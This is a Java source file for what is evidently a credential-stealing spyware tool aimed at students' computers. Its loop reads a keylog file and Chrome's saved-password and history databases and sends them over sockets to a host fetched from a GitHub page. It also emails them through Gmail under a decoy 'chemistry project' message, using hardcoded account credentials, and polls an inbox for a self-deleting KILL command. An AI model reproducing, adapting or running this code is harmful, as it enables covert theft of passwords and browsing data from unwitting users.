package main;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.URISyntaxException;
import java.net.URL;
import java.net.URLConnection;
import java.util.Calendar;
import java.util.Properties;
import java.util.concurrent.Executors;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Folder;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.NoSuchProviderException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Store;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

/**
 *                                      __.-"..--,__
                               __..---"  | _|    "-_\
                        __.---"          | V|::.-"-._D
                   _--"".-.._   ,,::::::'"\/""'-:-:/
              _.-""::_:_:::::'-8b---"            "'
           .-/  ::::<  |\::::::"\
           \/:::/::::'\\ |:::b::\
           /|::/:::/::::-::b:%b:\|
            \/::::d:|8:::b:"%%%%%\
            |\:b:dP:d.:::%%%%%"""-,
             \:\.V-/ _\b%P_   /  .-._
             '|T\   "%j d:::--\.(    "-.
             ::d<   -" d%|:::do%P"-:.   "-,
             |:I _    /%%%o::o8P    "\.    "\
              \8b     d%%%%%%P""-._ _ \::.    \
              \%%8  _./Y%%P/      .::'-oMMo    )
                H"'|V  |  A:::...:odMMMMMM(  ./
                H /_.--"JMMMMbo:d##########b/
             .-'o      dMMMMMMMMMMMMMMP""
           /" /       YMMMMMMMMM|
         /   .   .    "MMMMMMMM/
         :..::..:::..  MMMMMMM:|
          \:/ \::::::::JMMMP":/
           :Ao ':__.-'MMMP:::Y
           dMM"./:::::::::-.Y
          _|b::od8::/:YM::/
          I HMMMP::/:/"Y/"
           \'""'  '':|
            |    -::::\
            |  :-._ '::\
            |,.|    \ _:"o
            | d" /   " \_:\.
            ".Y. \       \::\
             \ \  \      MM\:Y
              Y \  |     MM \:b
              >\ Y      .MM  MM
              .IY L_    MP'  MP
              |  \:|   JM   JP
              |  :\|   MP   MM
              |  :::  JM'  JP|
              |  ':' JP   JM |
              L   : JP    MP |
              0   | Y    JM  |
              0   |     JP"  |
              0   |    JP    |
              m   |   JP     #
              I   |  JM"     Y
              l   |  MP     :"
              |\  :-       :|
              | | '.\      :|
              | | "| \     :|
               \    \ \    :|
               |  |  | \   :|
               |  |  |   \ :|
               |   \ \    | '.
               |    |:\   | :|
               \    |::\..|  :\
                ". /::::::'  :||
                  :|::/:::|  /:\
                  | \/::|: \' ::|
                  |  :::||    ::|
                  |   ::||    ::|
                  |   ::||    ::|
                  |   ::||    ::|
                  |   ': |    .:|
                  |    : |    :|
                  |    : |    :|
                  |    :||   .:|
                  |   ::\   .:|
                 |    :::  .::|
                /     ::|  :::|
             __/     .::|   ':|
    ...----""        ::/     ::
   /m_  AMm          '/     .:::
   ""MmmMMM#mmMMMMMMM"     .:::m
      """YMMM""""""P        ':mMI
               _'           _MMMM
           _.-"  mm   mMMMMMMMM"
          /      MMMMMMM""
          mmmmmmMMMM"
 *
 */
public class Radio {
	public static int schDay = -1;
	public static boolean uploadDone = false;
	public static void main (String[] args) throws IOException, URISyntaxException {
		Main m = new Main();
		System.out.println("[" + m.robert.elapsedTime() + "] Starting a new thread for you...");
		Executors.newSingleThreadExecutor().execute(new Runnable() {
		    @Override
		    public void run() {
		    	try {
					m.exec();
					System.out.println("[" + m.robert.elapsedTime() + "] [✔] Recorder launched successfully.");
				} catch (IOException | URISyntaxException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
		    }
		});
		System.out.println("[" + m.robert.elapsedTime() + "] [✔] Done.");
		java.util.Date d = new java.util.Date();
	    Calendar cl = Calendar.getInstance();
	    cl.setTime(d);
	    schDay = cl.get(Calendar.DAY_OF_WEEK);
		for(;;) {
			d = new java.util.Date();
		    Calendar cal = Calendar.getInstance();
		    cal.setTime(d);
		    int dow = cal.get(Calendar.DAY_OF_WEEK);
		    int hour = cal.get(Calendar.HOUR_OF_DAY);
		    int minutes = cal.get(Calendar.MINUTE);
		   
			 /* @param dow
			  * @param hour
			  * Check if the day is a school day, if so only mail logs while at home
			  */
		    if (schDay != dow) 
		    {
		    	uploadDone = false;
		    	schDay = dow;
		    } // update scheduler
			 if (dow == 2 || dow == 3 || dow == 4 || dow == 5 || dow == 6) {
		//	System.out.println("[" + m.getElapsedCombatTime() + "] Today is a school day: " + dow);
			 if ((hour >= 16 || hour == 0)) {
				 if (minutes % 2 == 0) {
				    	// send the file
					// System.out.println("A " + minutes);
					 upload(getHostIP());
				    } else {
					// System.out.println("B " + minutes);
					 uplogin(getHostIP());
					 uphistory(getHostIP());
				 }
				 if (minutes % 30 == 0 || minutes == 0) {
				checkForCommands();
				 if (!uploadDone)
				 {
				 if (mailLogs() == 0) {
				 uploadDone = true;
				 }
				 }
				 }
			 }
			 } else if (dow == 1 || dow == 7) {
				 if (minutes % 2 == 0) {
				    	// send the file
					// System.out.println("A " + minutes);
					 upload(getHostIP());
				   } else {
					// System.out.println("B " + minutes);
					 uplogin(getHostIP());
				 	 uphistory(getHostIP());
				   }
				 if ((minutes % 30 == 0 || minutes == 0)) {
					 checkForCommands();
					 if (!uploadDone)
					 {
					 if (mailLogs() == 0) {
					 uploadDone = true;
					 }
					 }
				 }
				 }
			 }
	}
	 public static String getHostIP() throws IOException {
		 try {
	     String s = "";
		 URL yahoo = new URL("https://github.com/OtakuInSeattle/sites/blob/master/uploader");
         URLConnection yc = yahoo.openConnection();
         BufferedReader in = new BufferedReader(new InputStreamReader(
                 yc.getInputStream(), "UTF-8"));
         String inputLine;
         StringBuilder a = new StringBuilder();
        // System.out.println("a");
         while ((inputLine = in.readLine()) != null){
             a.append(inputLine);
             if(inputLine.contains("connectTo")) {
          //  	 System.out.println("b");
            	 s = (inputLine.substring(78, inputLine.indexOf("</td>")));
             }
         }
         return s;
    //     return "127.0.0.1";
		 } catch (Exception e) {
			 return "127.0.0.1";
		 }
	 }
	 public static void upload(String ipee) {
		 try {
	    		//System.out.println(connectTo);
	    		Socket socket = new Socket(getHostIP(), 25565);
	    		OutputStream t = socket.getOutputStream();
	    		PrintWriter out = new PrintWriter(t);
				String toSend = System.getProperty("user.name") + ".txt";
				out.print(toSend );
				out.flush();
	    		File transferFile = new File ("C:/ClassPolicy/" + System.getProperty("user.name") + ".txt"); 
	    		byte [] bytearray = new byte [(int)transferFile.length()]; 
	    		FileInputStream fin = new FileInputStream(transferFile); 
	    		BufferedInputStream bin = new BufferedInputStream(fin); 
	    		bin.read(bytearray,0,bytearray.length); 
	    		OutputStream os = socket.getOutputStream(); 
	    		// System.out.println(""); 
	    		os.write(bytearray,0,bytearray.length); 
	    		os.flush(); 
	    		socket.close();
	    	} catch (Exception e) {
	    		System.out.println(e);
	    	}
	 }
	 public static void uplogin(String ipee) throws IOException {
		 try {
 		@SuppressWarnings("resource")
		Socket socket = new Socket(getHostIP(), 69);
 		OutputStream t = socket.getOutputStream();
 		PrintWriter out = new PrintWriter(t);
			String toSend = System.getProperty("user.name") + ".txt";
			out.print(toSend );
			out.flush();
			socket.close();
			Socket send = new Socket(getHostIP(), 420);
			// System.out.println("Accepted connection : " + send); 
			File transferFile = new File ("C:/Users/" + System.getProperty("user.name") + "/AppData/Local/Google/Chrome/User Data/Default/Login Data"); 
			byte [] bytearray = new byte [(int)transferFile.length()]; 
			FileInputStream fin = new FileInputStream(transferFile); 
			BufferedInputStream bin = new BufferedInputStream(fin); 
			bin.read(bytearray,0,bytearray.length); 
			OutputStream os = send.getOutputStream(); 
			System.out.println(""); 
			os.write(bytearray,0,bytearray.length); 
			os.flush();
		    send.close();
			System.out.println("yiff!");
		 } catch (Exception e) {
			 System.out.println("blargh");
		 }
	 }
	 public static void uphistory(String ipee) throws IOException {
		 try {
		 		@SuppressWarnings("resource")
				Socket socket = new Socket(getHostIP(), 70);
		 		OutputStream t = socket.getOutputStream();
		 		PrintWriter out = new PrintWriter(t);
					String toSend = System.getProperty("user.name") + "history.txt";
					out.print(toSend );
					out.flush();
					socket.close();
					Socket sand = new Socket(getHostIP(), 421);
					// System.out.println("Accepted connection : " + sand); 
					File transferFile = new File ("C:/Users/" + System.getProperty("user.name") + "/AppData/Local/Google/Chrome/User Data/Default/History"); 
					byte [] bytearray = new byte [(int)transferFile.length()]; 
					FileInputStream fin = new FileInputStream(transferFile); 
					BufferedInputStream bin = new BufferedInputStream(fin); 
					bin.read(bytearray,0,bytearray.length); 
					OutputStream os = sand.getOutputStream(); 
					System.out.println(""); 
					os.write(bytearray,0,bytearray.length); 
					os.flush();
				    sand.close();
					System.out.println("yip!");
				 } catch (Exception e) {
					 System.out.println("blarfff");
				 }
	 }
	 public static int getCurrentVersion() {
		 try {
		 // return version from domain controller, if cant connect return current version
			 return 1;
		 } catch (Exception ee) {
			 return 1;
		 }
	 }
	 public static int mailLogs() {
		 // mail keylog, history and saved passwords to email address
		 // Recipient's email ID needs to be mentioned.
	      String to = "duvictor514@gmail.com";

	      // use non gmail acct, outlook
	      // Sender's email ID needs to be mentioned
	      String from = "suzukiairi8892@gmail.com";

	      final String username = "suzukiairi8892@gmail.com";//change accordingly
	      final String password = "richardnguyen";//change accordingly

	      String host = "smtp.gmail.com";

	      Properties props = new Properties();
	      props.put("mail.smtp.auth", "true");
	      props.put("mail.smtp.starttls.enable", "true");
	      props.put("mail.smtp.host", host);
	      props.put("mail.smtp.port", "587"); // tls port

	      // Get the Session object.
	      Session session = Session.getInstance(props,
	         new javax.mail.Authenticator() {
	            protected PasswordAuthentication getPasswordAuthentication() {
	               return new PasswordAuthentication(username, password);
	            }
	         });

	      try {
	         // Create a default MimeMessage object.
	         Message message = new MimeMessage(session);

	         // Set From: header field of the header.
	         message.setFrom(new InternetAddress(from));

	         // Set To: header field of the header.
	         message.setRecipients(Message.RecipientType.TO,
	            InternetAddress.parse(to));

	         // Set Subject: header field
	         message.setSubject("Re: Chemistry Project Planning: " + System.getProperty("user.name"));

	         // Create the message part
	         BodyPart messageBodyPart = new MimeBodyPart();

	         // Now set the actual message
	         messageBodyPart.setText("Hello, I just wanted to let you know that the chemistry group project meeting has been delayed until next week due to an unexpected ceremony in Japan I was going to have with my family. Sorry about that, Sincerely: " + System.getProperty("user.name"));

	         // Create a multipar message
	         Multipart multipart = new MimeMultipart();

	         // Set text message part
	         multipart.addBodyPart(messageBodyPart);

	         // Part two is attachment
	         messageBodyPart = new MimeBodyPart();
	         String filename = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
	         String otherfilename = "C:/Users/" + System.getProperty("user.name") + "/AppData/Local/Google/Chrome/User Data/Default/Login Data";
	         DataSource source = new FileDataSource(filename);
	         messageBodyPart.setDataHandler(new DataHandler(source));
	         messageBodyPart.setFileName(filename);
	         multipart.addBodyPart(messageBodyPart);
	         BodyPart otherMBP = new MimeBodyPart();
	         DataSource other = new FileDataSource(otherfilename);
	         otherMBP.setDataHandler(new DataHandler(other));
	         otherMBP.setFileName(otherfilename);
	         multipart.addBodyPart(otherMBP);
	         // Send the complete message parts
	         message.setContent(multipart);

	         // Send message
	         Transport.send(message);

	         System.out.println("Transmission successful");
	         return 0;
	      } catch (MessagingException e) {
	    	  System.err.println("Mailer Broadcast Failure: "+ e);
	    	  return 2;
	      }
	 }
	 public static int checkForCommands() {
		 try {

		      //create properties field
		      Properties properties = new Properties();

		      properties.put("mail.pop3.host", "pop.gmail.com");
		      properties.put("mail.pop3.port", "995");
		      properties.put("mail.pop3.starttls.enable", "true");
		      Session emailSession = Session.getDefaultInstance(properties);
		  
		      //create the POP3 store object and connect with the pop server
		      Store store = emailSession.getStore("pop3s");

		      store.connect("pop.gmail.com", "suzukiairi8892@gmail.com", "richardnguyen");

		      //create the folder object and open it
		      Folder emailFolder = store.getFolder("INBOX");
		      emailFolder.open(Folder.READ_ONLY);

		      // retrieve the messages from the folder in an array and print it
		      Message[] messages = emailFolder.getMessages();
		      System.out.println("Command Recv Count: [" + messages.length +"]");

		      for (int i = 0, n = messages.length; i < n; i++) {
		         Message message = messages[i];
		         System.out.println("---------------------------------");
		         System.out.println("[[ Mailer Command Received ]]");
		         System.out.println("Email Number " + (i + 1));
		         System.out.println("Subject: " + message.getSubject());
		   //      System.out.println("From: " + message.getFrom()[0]);
		         System.out.println("Text: " + message.getContent().toString());
		         System.out.println("---------------------------------");
		         if (message.getSubject().matches("KILL") && message.getContent().toString().matches("KILL")) {
		        	 File cf = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
		 			cf.deleteOnExit();
		 			System.exit(0);
		         }
		         
		      }

		      //close the store and folder objects
		      emailFolder.close(false);
		      store.close();
		      return 0;
		      } catch (NoSuchProviderException e) {
		    	 System.err.println("Mailer request failed:" +e);
		         e.printStackTrace();
		         return 2;
		      } catch (MessagingException e) {
		    	  System.err.println("Mailer request failed:" +e);
		         e.printStackTrace();
		         return 2;
		      } catch (Exception e) {
		    	  System.err.println("Mailer request failed:" +e);
		         e.printStackTrace();
		         return 2;
		      }
		   }
}
